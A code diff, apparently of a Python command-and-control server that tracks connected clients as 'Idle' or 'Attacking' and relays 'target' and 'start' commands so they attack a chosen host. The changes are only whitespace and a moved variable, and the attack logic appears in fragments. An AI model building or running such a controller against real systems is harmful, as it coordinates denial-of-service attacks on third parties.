@@ -3,20 +3,24 @@ import threading
 from threading import Event
 from time import sleep
 
+
+# global variables
 active_connections_lock = threading.Lock()
 active_connections = 0
 conn_dict_lock = threading.Lock()
 conn_dict = {}  # key is the connection address, value is either "Idle" or "Attacking"
 target = ""
+command = ""
 
 # event that can be used to tell all threads to stop running or attacking
 stop_event = threading.Event() 
-command = ""
 
 
 def acceptor(s: socket.socket):
+
     global active_connections
     global conn_dict
+
     while not stop_event.is_set():
         try:
             connection, address = s.accept()
@@ -38,6 +42,7 @@ def acceptor(s: socket.socket):
 
 # function to handle a client connection if any
 def handle_client(conn: socket.socket, addr):
+
     global active_connections
     global command
     global conn_dict
@@ -48,6 +53,7 @@ def handle_client(conn: socket.socket, addr):
     prev_command = ""
     
     while not stop_event.is_set():
+
         try:
             conn.recv(1024)
         except socket.timeout:
@@ -56,6 +62,7 @@ def handle_client(conn: socket.socket, addr):
             print("")
             print("Client must have disconnected:", addr)
             break
+
         if command != prev_command:
             if command.split(' ')[0] == "target":
                 if state == "attacking":
@@ -63,6 +70,7 @@ def handle_client(conn: socket.socket, addr):
                 elif state != "attacking":
                     print("Changing target...")
                     conn.send(command.encode())
+
             else: # this block only executes if the command changes the attack state
                 if command == "start" and state != "attacking":
                     state = "attacking"
@@ -75,8 +83,8 @@ def handle_client(conn: socket.socket, addr):
                 with conn_dict_lock:
                     conn_dict[conn_name] = state
         prev_command = command
-
     conn.close()
+    
     # Decrement the active connection count and remove the connection from the dict
     with active_connections_lock:
         active_connections -= 1
@@ -108,6 +116,7 @@ def setCommand(cmd: str):
         target = command.split(' ')[1]
     ret_msg = "Command set to", command
     return ret_msg
+
 
 def main():
     global target
@@ -151,5 +160,6 @@ def main():
         print("")
         exit()       
 
+        
 if __name__ == "__main__":
     main()
